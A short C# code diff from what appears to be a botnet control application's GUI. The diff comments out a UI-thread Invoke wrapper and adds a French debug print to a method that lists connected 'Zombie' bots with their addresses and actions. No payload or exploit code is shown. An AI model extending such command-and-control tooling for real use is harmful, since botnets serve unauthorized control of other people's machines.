@@ -336,15 +336,17 @@ namespace BotnetAPP.UI
 
         private void RefreshBoard(object sender) {
 
-             Application.Invoke(delegate {
+             //Application.Invoke(delegate {
                     ListStore.Clear() ;
+
+                    Console.WriteLine("On passe ici") ; 
                     
                     Dictionary<Zombie, System.Net.Sockets.Socket> connectedUser = _Net.GetConnectedBot ;
 
             foreach ( KeyValuePair<Zombie, System.Net.Sockets.Socket> item in connectedUser)  {
                 ListStore.AppendValues(item.Value.RemoteEndPoint.ToString(), item.Key.GetAction ) ; 
             }
-             }) ;
+           //  }) ;
         }
     }
 }
